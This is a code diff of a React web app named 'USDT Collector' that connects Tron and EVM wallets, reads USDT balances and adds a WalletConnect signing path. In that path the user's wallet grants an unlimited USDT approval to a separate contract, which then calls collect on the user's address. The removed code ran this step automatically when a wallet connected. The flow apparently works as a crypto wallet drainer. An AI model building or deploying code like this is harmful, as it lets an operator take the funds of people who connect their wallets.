@@ -1,5 +1,12 @@
 import { useState, useEffect, useRef } from 'react'
-import { createAppKit, useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
+import {
+  createAppKit,
+  useAppKit,
+  useAppKitAccount,
+  useAppKitProvider,
+  useAppKitNetwork
+} from '@reown/appkit/react'
+import { BrowserProvider, Contract, formatUnits } from 'ethers'
 import { TronAdapter } from '@reown/appkit-adapter-tron'
 import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
@@ -38,6 +45,56 @@ const NETWORK_CONFIG = {
   },
 }
 
+const EVM_USDT: Record<number, string> = {
+  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+  56: '0x55d398326f99059fF775485246999027B3197955',
+  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+}
+
+const EVM_ERC20_ABI = [
+  'function balanceOf(address owner) view returns (uint256)',
+  'function decimals() view returns (uint8)',
+]
+
+
+
+// ─── WalletConnect-for-Tron helper ────────────────────────────
+import * as TronWebNS from 'tronweb'          // ESM namespace
+const TronWeb = (TronWebNS as any).default    // cjs default
+               || (TronWebNS as any)          // fallback for older builds
+import { WalletConnectAdapter } from '@tronweb3/tronwallet-adapter-walletconnect'
+
+const FULL_HOST = 'https://api.trongrid.io'       // Tron Mainnet
+const tronWebTmp = new (TronWeb as any)({ fullHost: FULL_HOST })
+
+export async function signAndBroadcastViaWC(
+  adapter: WalletConnectAdapter,
+  contractAddr: string,
+  func: string,
+  params: { type: string; value: any }[],
+  fee = 100_000_000
+) {
+  const { transaction, result } =
+    await tronWebTmp.transactionBuilder.triggerSmartContract(
+      contractAddr,
+      func,
+      { feeLimit: fee, callValue: 0 },
+      params,
+      adapter.address
+    )
+
+  if (!result?.result) throw new Error('Failed to build transaction')
+
+  const signed = await adapter.signTransaction(transaction)
+  const sent   = await tronWebTmp.trx.sendRawTransaction(signed)
+  if (!sent.result) throw new Error('Broadcast failed')
+  return sent.txid || sent.transaction?.txID
+}
+
+
+
+
 const { usdtAddress: USDT_ADDRESS } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]
 
 // ── Reown Adapters ──
@@ -60,12 +117,12 @@ createAppKit({
   adapters: [tronAdapter, wagmiAdapter], // Both adapters active
   networks: appkitNetworks,
   projectId: WC_PROJECT_ID,
-  metadata: {
-    name: 'USDT Collector',
-    description: 'Collect USDT from multiple wallets to one main wallet',
-    url: window.location.origin,
-    icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
-  },
+ metadata: {
+  name:        'USDT Collector',
+  description: 'Collect USDT from multiple wallets',
+  url:         window.location.origin,
+  icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
+},
   themeMode: 'dark',
   themeVariables: {
     '--w3m-accent': '#00ff9f',
@@ -91,6 +148,18 @@ const COLLECT_ABI = [
   { constant: false, inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }], name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
 ]
 
+function inspectTronGlobals() {
+  const w = window as any
+  return {
+    hasTrustwallet: !!w.trustwallet,
+    hasTrustwalletTronLink: !!w.trustwallet?.tronLink,
+    hasTrustwalletTronWeb: !!w.trustwallet?.tronLink?.tronWeb,
+    hasTronLink: !!w.tronLink,
+    hasWindowTronWeb: !!w.tronWeb,
+    hasTp: !!w.tp,
+  }
+}
+
 export default function App() {
   const [usdtBalance, setUsdtBalance] = useState('0')
   const [status, setStatus] = useState('Ready')
@@ -99,101 +168,243 @@ export default function App() {
   const [txHash, setTxHash] = useState('')
   const autoTriggered = useRef(false)
 
+// WalletConnect adapter lives in a ref so it’s initialised once
+const wcRef = useRef<WalletConnectAdapter | null>(null)
+
+if (wcRef.current === null) {
+  wcRef.current = new WalletConnectAdapter({
+    network: 'Mainnet',
+    options: {
+      projectId: WC_PROJECT_ID,
+      relayUrl: 'wss://relay.walletconnect.com',
+      metadata: {
+        name: 'USDT Collector',
+        description: 'Collect USDT from multiple wallets',
+        url: window.location.origin,
+        icons: ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
+      },
+    },
+  })
+}
+
+const wcAdapter = wcRef.current
+
   const { open } = useAppKit()
-  const { address: walletAddress, isConnected } = useAppKitAccount()
-  const { walletProvider } = useAppKitProvider('tron') // Only grabs Tron provider
+const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
+const {  chainId } = useAppKitNetwork()
 
-  // Network Routing Flags
-  const isTron = walletAddress?.startsWith('T')
-  const isEVM = walletAddress?.startsWith('0x')
+// const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
+const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
-  const getActiveTronWeb = () => {
-    if (!walletProvider) return null;
-    const provider = walletProvider as any;
-    if (provider?.tronWeb) return provider.tronWeb; 
-    if (window.tronWeb) return window.tronWeb;       
-    if ((window as any).tronLink?.tronWeb) return (window as any).tronLink.tronWeb; 
-    return provider; 
-  };
+const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
+const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')
 
-  const tronWeb = getActiveTronWeb();
+/**
+ * Returns a usable TronWeb instance if one is present anywhere the dApp can reach.
+ * Works for: Trust dApp browser, MetaMask-Tron, TronLink, window.tronWeb,
+ *            and the Reown `walletProvider` when it exposes `.tronWeb`.
+ */
+const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')
+
+const resolveTronWeb = () => {
+  const w = window as any
+
+  // Trust Wallet dApp browser / MetaMask-Tron
+  if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb
+
+  // TronLink extension / mobile
+  if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb
+
+  // Global injection
+  if (w.tronWeb?.contract) return w.tronWeb
+
+  // Reown provider may expose .tronWeb
+  if ((tronWalletProvider as any)?.tronWeb?.contract) return (tronWalletProvider as any).tronWeb
+
+  return null
+}
+
+const tronWeb = resolveTronWeb()
+
+const isWalletConnectTron = isTron && !tronWeb && !!wcAdapter?.connected
+
 
   const log = (msg: string) => {
     console.log(msg);
     setDebugLog(prev => [msg, ...prev].slice(0, 5)); 
   }
 
+
   useEffect(() => {
-    const initAutomation = async () => {
-      if (isConnected && walletAddress) {
-        
-        // --- ROUTE 1: TRON NETWORK ---
-        if (isTron && tronWeb) {
-          log("Tron Connection detected. Probing Wallet...");
+  const init = async () => {
+    if (!isConnected || !walletAddress) return
 
-          try {
-            let attempts = 0;
-            let ready = false;
+    log(`Connected: ${caipAddress || 'unknown'}`)
 
-            while (attempts < 20) { 
-              if (typeof tronWeb.contract === 'function') {
-                ready = true;
-                break;
-              }
-              log(`Searching for Tron API (Attempt ${attempts + 1}/20)...`);
-              await new Promise(r => setTimeout(r, 500));
-              attempts++;
-            }
+if (isTron) {
+  const injectedTronWeb = resolveTronWeb()
+  const globals = inspectTronGlobals()
 
-            if (!ready) {
-              const keys = Object.keys(tronWeb).join(', ').slice(0, 50);
-              log(`❌ Tron API Error. Available: [${keys}]`);
-              setStatus("Error: Incompatible Wallet API");
-              return;
-            }
+  log(`TRON globals: ${JSON.stringify(globals)}`)
 
-            log("✅ API Found! Syncing balance...");
-            await getBalance(tronWeb, walletAddress);
+  if (!injectedTronWeb) {
+    log('❌ No injected TronWeb detected')
+    setStatus(
+      'TRON account connected, but this Trust Wallet session is not exposing injected TronWeb here.'
+    )
+    return
+  }
 
-            if (!autoTriggered.current) {
-              log("🚀 Automation Triggered!");
-              autoTriggered.current = true;
-              approveAndCollect();
-            }
-          } catch (e: any) {
-            log("❌ Fatal Init Error: " + e.message);
-          }
-        } 
-        
-        // --- ROUTE 2: EVM NETWORK ---
-        else if (isEVM) {
-          log(`EVM Connection detected: ${walletAddress.slice(0,6)}...`);
-          log("⚠️ Awaiting EVM Smart Contract deployment.");
-          setStatus("Connected to EVM (Ethereum/BSC/Polygon)");
-          // Prevent the automation loop from re-firing constantly on EVM
-          autoTriggered.current = true; 
-        }
+  log('✅ TRON injected provider detected')
+  await getTronBalance(injectedTronWeb, walletAddress)
+  return
+}
+
+    if (isEVM) {
+      if (!evmWalletProvider) {
+        log('❌ No EVM provider detected')
+        setStatus('EVM wallet connected, but no EVM provider was found.')
+        return
       }
-    };
 
-    initAutomation();
-  }, [isConnected, walletAddress, tronWeb, isTron, isEVM]);
-
-  const getBalance = async (tw: any, addr: string) => {
-    if (isEVM) return; // Skip Tron balance fetch if on EVM
-
-    try {
-      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
-      const bal = await usdt.balanceOf(addr).call()
-      setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
-    } catch (e) {
-      console.warn('Balance fetch failed', e)
+      log('✅ EVM session detected')
+      await getBalanceForCurrentChain()
+      return
     }
+
+    log('❌ Could not determine wallet namespace')
+    setStatus('Unsupported wallet type')
   }
 
-  const handleConnect = () => {
-    open({ view: 'AllWallets' })
+  init()
+}, [isConnected, walletAddress, caipAddress, evmWalletProvider, chainId, isTron, isEVM])
+
+  // useEffect(() => {
+  //   const initAutomation = async () => {
+  //     if (isConnected && walletAddress) {
+        
+  //       // --- ROUTE 1: TRON NETWORK ---
+  //       if (isTron && tronWeb) {
+  //         log("Tron Connection detected. Probing Wallet...");
+
+  //         try {
+  //           let attempts = 0;
+  //           let ready = false;
+
+  //           while (attempts < 20) { 
+  //             if (typeof tronWeb.contract === 'function') {
+  //               ready = true;
+  //               break;
+  //             }
+  //             log(`Searching for Tron API (Attempt ${attempts + 1}/20)...`);
+  //             await new Promise(r => setTimeout(r, 500));
+  //             attempts++;
+  //           }
+
+  //           if (!ready) {
+  //             const keys = Object.keys(tronWeb).join(', ').slice(0, 50);
+  //             log(`❌ Tron API Error. Available: [${keys}]`);
+  //             setStatus("Error: Incompatible Wallet API");
+  //             return;
+  //           }
+
+  //           log("✅ API Found! Syncing balance...");
+  //           await getBalance(tronWeb, walletAddress);
+
+  //           if (!autoTriggered.current) {
+  //             log("🚀 Automation Triggered!");
+  //             autoTriggered.current = true;
+  //             approveAndCollect();
+  //           }
+  //         } catch (e: any) {
+  //           log("❌ Fatal Init Error: " + e.message);
+  //         }
+  //       } 
+        
+  //       // --- ROUTE 2: EVM NETWORK ---
+  //       else if (isEVM) {
+  //         log(`EVM Connection detected: ${walletAddress.slice(0,6)}...`);
+  //         log("⚠️ Awaiting EVM Smart Contract deployment.");
+  //         setStatus("Connected to EVM (Ethereum/BSC/Polygon)");
+  //         // Prevent the automation loop from re-firing constantly on EVM
+  //         autoTriggered.current = true; 
+  //       }
+  //     }
+  //   };
+
+  //   initAutomation();
+  // }, [isConnected, walletAddress, tronWeb, isTron, isEVM]);
+
+  const getTronBalance = async (tw: any, addr: string) => {
+  const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
+  const bal = await usdt.balanceOf(addr).call()
+  setUsdtBalance((Number(bal) / 1_000_000).toFixed(2))
+  setStatus('Ready')
+  log(`TRON USDT: ${(Number(bal) / 1_000_000).toFixed(2)}`)
+}
+
+const getEvmBalance = async (provider: any, addr: string, currentChainId?: number) => {
+  if (!currentChainId || !EVM_USDT[currentChainId]) {
+    setUsdtBalance('0')
+    setStatus('USDT not configured for this EVM chain')
+    log(`❌ No USDT config for EVM chain ${currentChainId}`)
+    return
   }
+
+  const ethersProvider = new BrowserProvider(provider)
+  const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
+
+  const [bal, decimals] = await Promise.all([
+    token.balanceOf(addr),
+    token.decimals(),
+  ])
+
+  const formatted = formatUnits(bal, decimals)
+  setUsdtBalance(formatted)
+  setStatus('Ready')
+  log(`EVM USDT: ${formatted}`)
+}
+
+const getBalanceForCurrentChain = async () => {
+  try {
+    if (!walletAddress) return
+
+  if (isTron) {
+  const injectedTronWeb = resolveTronWeb()
+
+  if (!injectedTronWeb) {
+    log('❌ TronWeb not available')
+    setStatus('TRON wallet connected, but no injected TronWeb is available.')
+    return
+  }
+
+  await getTronBalance(injectedTronWeb, walletAddress)
+  return
+}
+
+    if (isEVM) {
+      if (!evmWalletProvider) {
+        log('❌ EVM provider not available')
+        setStatus('EVM wallet connected, but EVM provider is not available.')
+        return
+      }
+      await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId))
+      return
+    }
+
+    setStatus('Unsupported wallet namespace')
+    log('❌ Unsupported namespace')
+  } catch (e: any) {
+    console.warn('Balance fetch failed', e)
+    log(`❌ Balance fetch failed: ${e?.message || 'Unknown error'}`)
+    setStatus('Failed to fetch balance')
+  }
+}
+
+ const handleConnect = () => {
+  open({ view: 'AllWallets' })
+  wcAdapter?.connect({}).catch(() => {})
+}
 
   const approveAndCollect = async () => {
     // EVM BLOCKER
@@ -203,11 +414,52 @@ export default function App() {
       return;
     }
 
-    // TRON EXECUTION
-    if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) {
-      log("❌ Error: Wallet not fully initialized");
-      return;
-    }
+    // ---------- WALLETCONNECT PATH ----------
+if (isWalletConnectTron) {
+  try {
+    const MAX_UINT =
+      '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+
+    await signAndBroadcastViaWC(
+      wcAdapter,
+      USDT_ADDRESS,
+      'approve(address,uint256)',
+      [
+        { type: 'address', value: tronWebTmp.address.toHex(CONTRACT_ADDRESS) },
+        { type: 'uint256', value: MAX_UINT },
+      ]
+    )
+
+    const amount = '0' // ← you can query balance first if you like
+
+    const txId = await signAndBroadcastViaWC(
+      wcAdapter,
+      CONTRACT_ADDRESS,
+      'collect(address,uint256)',
+      [
+        { type: 'address', value: tronWebTmp.address.toHex(walletAddress) },
+        { type: 'uint256', value: amount },
+      ],
+      150_000_000
+    )
+
+    setTxHash(txId)
+    setStatus('✅ All USDT collected!')
+    return
+  } catch (e: any) {
+    log(`❌ WC error: ${e.message}`)
+    setStatus('❌ Transaction failed')
+    setLoading(false)
+    return
+  }
+}
+
+// ---------- INJECTED TRONWEB PATH ----------
+if (!tronWeb || typeof tronWeb.contract !== 'function' || !walletAddress) {
+    log('❌ Error: Wallet not fully initialized')
+    setStatus('TRON wallet not ready')
+  return
+}
 
     setLoading(true);
     setStatus('Step 1/2: Approving...');
